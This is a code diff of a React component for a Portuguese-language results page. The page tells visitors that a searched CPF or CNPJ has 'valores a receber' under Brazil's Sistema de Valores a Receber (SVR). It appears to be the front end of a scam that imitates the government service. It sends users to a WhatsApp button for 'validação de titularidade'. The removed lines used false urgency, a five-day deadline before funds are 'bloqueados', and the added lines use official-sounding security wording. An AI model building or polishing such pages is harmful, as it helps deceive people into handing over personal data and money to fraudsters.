@@ -159,86 +159,67 @@ export function Step2({ data, onReset }: Step2Props) {
       {analysisState === "results" && (
         <motion.div
           key="results"
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[420px] mx-auto shadow-sm transition-colors duration-300"
+          initial={{ opacity: 0, y: 10 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[650px] mx-auto shadow-sm transition-colors duration-300"
         >
-          <div className="px-5 py-[18px] border-b border-[#ddd] dark:border-[#2a373d] flex items-baseline justify-between bg-gray-50/50 dark:bg-[#1a2227]/50 transition-colors duration-300">
-            <h2 className="text-[#626e7a] dark:text-[#9eaeb8] text-[20px] font-bold transition-colors duration-300">Relatório de Consulta</h2>
-            <span className="text-[#626e7a] dark:text-[#9eaeb8] text-[14px] font-medium transition-colors duration-300">Oficial</span>
-          </div>
-
-          <div className="p-6 text-center space-y-6">
-            <div className="flex flex-col items-center gap-3">
-              <div className="w-14 h-14 rounded-full border-[2.5px] border-[#00df6c] flex items-center justify-center bg-green-50/30 dark:bg-green-900/20">
-                <CheckCircle2 className="text-[#00df6c]" size={32} strokeWidth={2.5} />
-              </div>
-              <h2 className="text-[22px] font-bold text-[#333333] dark:text-white tracking-tight transition-colors duration-300">Saldos Identificados</h2>
-            </div>
-
-            <div className="bg-[#eff6ff] dark:bg-[#1e2a3b] rounded-[8px] p-5 space-y-4 border border-[#dbeafe] dark:border-[#2c3e50] transition-colors duration-300">
-              <div className="flex justify-between items-start sm:items-center gap-2 text-[#1e3a8a] dark:text-[#60a5fa]">
-                <div className="text-left flex-1 min-w-0">
-                  <span className="text-[10px] font-bold text-[#626e7a] dark:text-[#9eaeb8] uppercase tracking-wider block mb-1 transition-colors duration-300">Status de Ativos</span>
-                  <h3 className="text-[18px] sm:text-[22px] font-black text-[#1a407a] dark:text-[#93c5fd] leading-none transition-colors duration-300" style={{ wordBreak: 'break-word' }}>VALORES DISPONÍVEIS</h3>
+          <div className="p-8 md:p-10">
+            {/* Desktop: Two columns | Mobile: Stacked */}
+            <div className="flex flex-col md:flex-row gap-8 items-center md:items-start">
+              
+              {/* Left Column: Checkmark (Large) */}
+              <div className="flex-shrink-0 pt-2">
+                <div className="w-24 h-24 md:w-32 md:h-32 rounded-full flex items-center justify-center">
+                  <svg viewBox="0 0 24 24" className="w-full h-full text-[#4caf50]" fill="none" stroke="currentColor" strokeWidth="2.5">
+                    <polyline points="20 6 9 17 4 12" />
+                  </svg>
                 </div>
-                <div className="bg-green-500/10 text-green-700 px-2 py-1 rounded text-[10px] font-bold border border-green-200 uppercase flex-shrink-0 mt-1 sm:mt-0">Verificado</div>
               </div>
 
-              <div className="w-full h-px bg-[#3b82f6]/20"></div>
-
-              <div className="grid grid-cols-2 gap-4 text-left">
+              {/* Right Column: Content */}
+              <div className="flex-grow text-center md:text-left space-y-6">
                 <div className="space-y-1">
-                  <p className="text-[9px] text-[#3b82f6] font-extrabold uppercase">Titular</p>
-                  <p className="text-[13px] font-bold text-[#1e3a8a] dark:text-[#93c5fd] truncate">{data.docValue}</p>
-                </div>
-                <div className="space-y-1">
-                  <p className="text-[9px] text-[#3b82f6] font-extrabold uppercase">Nascimento</p>
-                  <p className="text-[13px] font-bold text-[#1e3a8a] dark:text-[#93c5fd]">{data.birthDate}</p>
-                </div>
-              </div>
-            </div>
-
-            <div className="space-y-4">
-              <div className="bg-gray-50 dark:bg-[#253238] border border-gray-200 dark:border-[#2a373d] p-4 rounded-[4px] flex gap-3 text-left shadow-sm transition-colors duration-300">
-                <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-full self-start">
-                  <Info className="text-[#1b668d] dark:text-[#429bb8]" size={18} />
-                </div>
-                <div className="space-y-1.5">
-                  <p className="text-[14px] font-bold text-gray-800 dark:text-gray-200 uppercase tracking-wide transition-colors duration-300">Atenção ao Prazo de Resgate</p>
-                  <p className="text-[13px] text-gray-600 dark:text-gray-400 leading-snug transition-colors duration-300">
-                    Informamos que o seu saldo identificado possui um prazo de resgate de até <strong className="dark:text-gray-200">5 dias úteis</strong>. Após esse período, os valores serão bloqueados para análise manual prolongada.
-                  </p>
-                  <div className="flex items-center gap-2 pt-1">
-                    <span className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
-                    <p className="text-[11px] font-bold text-blue-600 uppercase">Solicite a liberação agora para evitar bloqueios.</p>
+                  <h2 className="text-[24px] md:text-[28px] font-bold text-[#555] dark:text-white leading-tight">
+                    O {data.docType === 'CPF' ? 'CPF' : 'CNPJ'} pesquisado tem valores a receber
+                  </h2>
+                  <div className="text-[14px] md:text-[15px] text-[#888] dark:text-gray-400 font-medium">
+                    <p>{data.docType}: <b>{data.docValue}</b></p>
+                    <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <b>{data.birthDate}</b></p>
                   </div>
                 </div>
-              </div>
 
-              <div className="flex flex-col gap-3">
-                <button
-                  onClick={handleWhatsAppRedirect}
-                  className="w-full bg-[#1b668d] hover:bg-[#165576] text-white font-bold py-4 px-6 rounded-[4px] flex items-center justify-center gap-3 transition-all shadow-sm text-[16px] uppercase tracking-wide group"
-                >
-                  <Smartphone size={20} />
-                  ACESSAR RESGATE AGORA
-                  <ArrowRight size={18} className="ml-auto group-hover:translate-x-1 transition-transform" />
-                </button>
+                <div className="space-y-4 text-[14px] md:text-[15px] text-[#666] dark:text-gray-300 leading-relaxed font-medium">
+                  <p>
+                    Para a liberação dos valores ativos identificados em sua conta, é necessária a <b>validação de titularidade</b> junto ao atendimento especializado do Sistema de Valores a Receber (SVR).
+                  </p>
+                  <p>
+                    O procedimento segue rigorosos protocolos de segurança e autenticação para garantir a integridade do repasse de ativos. Tenha em mãos seus documentos de identificação para concluir o processo de forma célere.
+                  </p>
+                </div>
 
-                <div className="flex gap-2">
+                {/* Buttons Section */}
+                <div className="flex flex-col gap-3 pt-4 max-w-[320px] mx-auto md:mx-0">
                   <button
-                    onClick={onReset}
-                    className="flex-1 bg-white dark:bg-[#1a2227] hover:bg-gray-50 dark:hover:bg-[#253238] text-[#626e7a] dark:text-[#9eaeb8] border border-[#cccccc] dark:border-[#4b5563] font-bold py-2.5 px-3 rounded-[4px] text-[11px] flex items-center justify-center gap-2 uppercase transition-colors duration-300"
+                    onClick={handleWhatsAppRedirect}
+                    className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2.5 px-6 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm"
                   >
-                    Nova Consulta
+                    <ArrowRight size={18} className="rotate-[-45deg]" /> Acessar o SVR
                   </button>
-                  <button
-                    onClick={() => window.location.reload()}
-                    className="flex-1 bg-white dark:bg-[#1a2227] hover:bg-gray-50 dark:hover:bg-[#253238] text-gray-400 dark:text-gray-500 border border-[#dddddd] dark:border-[#4b5563] font-bold py-2.5 px-3 rounded-[4px] text-[11px] flex items-center justify-center gap-2 uppercase transition-colors duration-300"
-                  >
-                    Encerrar
-                  </button>
+
+                  <div className="grid grid-cols-2 gap-2">
+                    <button
+                      onClick={onReset}
+                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                    >
+                      <Search size={16} /> Nova consulta
+                    </button>
+                    <button
+                      onClick={() => window.location.reload()}
+                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                    >
+                      <X size={16} /> Sair
+                    </button>
+                  </div>
                 </div>
               </div>
             </div>
